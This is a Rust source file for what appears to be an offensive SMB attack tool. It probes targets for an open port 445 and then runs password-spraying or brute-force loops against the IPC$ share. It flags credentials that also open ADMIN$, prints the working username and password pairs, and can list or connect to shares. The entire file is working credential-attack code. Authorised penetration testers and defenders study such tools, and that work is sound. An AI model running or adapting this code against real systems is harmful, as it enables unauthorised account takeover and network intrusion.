use crate::args::Args;

use smb::{Client, ClientConfig, UncPath};
use std::str::FromStr;
use std::net::SocketAddr;
use tokio::net::TcpStream;
use tokio::time::{Duration, timeout};

// CONNECT TO SHARE
pub async fn connect_share(client: &Client, server: &str, share_name: &str, username: &str, password: &str) -> Result<(), smb::Error>{
    let target_path = UncPath::from_str(&format!(r"\\{}\{}", server, share_name)).unwrap();
    client.share_connect(&target_path, &username, password.to_string()).await
}

// LIST AVAILABLE SHARES
pub async fn list_shares(connection: Result<(), smb::Error>, client: &Client, server: &str) {
   match connection {
        Ok(_c) => {
            println!("[SHARES] Enumerating shares...");
            match client.list_shares(server).await {
                Ok(shares) => {
                    println!("\tShares:\n\t=======");
                    for share in shares {
                        match share.netname.as_ref() {
                            Some(ob) => {
                                let share_name = String::from_utf16(&ob.data).unwrap();
                                println!("\t{}\t{}", server, share_name);
                            }
                            None => (),
                        }
                    }
                }
                Err(e) => println!("{}", e),
            }
        }
        Err(e) => eprintln!("{}", e),
    }
}

// CHECK IF SMB IS OPEN ON TARGET
pub async fn check_open(ip: &str, port: u16) -> bool {
    let address = format!("{}:{}", ip, port);
    let server: SocketAddr = match address.parse() {
        Ok(addr) => addr,
        Err(_) => return false,
    };

    let stream = TcpStream::connect(&server);
    match timeout(Duration::from_secs(2), stream).await {
        Ok(Ok(_s)) => true,
        _ => false,
    }
}

// CORE ATTACK BRUTEFORCE / SPRAYING / CONNECT SHARE / LIST SHARE
pub async fn attack(users: &Vec<String>, passwords: &Vec<String>, targets: &Vec<String>, some_args: &Args) {
    let is_spraying = users.len() > 1 && passwords.len() == 1;
    let is_bruteforce = users.len() == 1 && passwords.len() > 1;
    
    if is_spraying { println!("[i] Starting spraying attack against {} users", users.len()) } 
    else if is_bruteforce { println!("[i] Starting bruteforce attack with {} passwords", passwords.len()); }
        
    for ip in targets {
        if check_open(&ip, 445).await {
            println!("[HOST] {}", ip);
            
            for username in users {
                for password in passwords {
                    let client = Client::new(ClientConfig::default());
                    let connection = connect_share(&client, &ip, "IPC$", &username, &password).await;
                    match connection {
                        Ok(_c) => {
                            let is_admin = connect_share(&client, &ip, "ADMIN$", &username, &password).await.is_ok();
                            println!("[ACCESS] {}:{} (Admin: {})", username, password, is_admin);
                            if some_args.list {
                                list_shares(connection, &client, &ip).await;
                            } else if let Some(ref share_target) = some_args.connect {
                                match connect_share(&client, &ip, &share_target, &username, &password).await {
                                    Ok(_c) => println!("[{}]", share_target),
                                    Err(e) => println!("[-] Error: {}", e),
                                }
                            }
                            if is_bruteforce { break; }
                        }
                        Err(_e) => println!("[-] {}:{}", username, password),
                    }
                }
            }
        } else {
            continue;
        }
    }
}
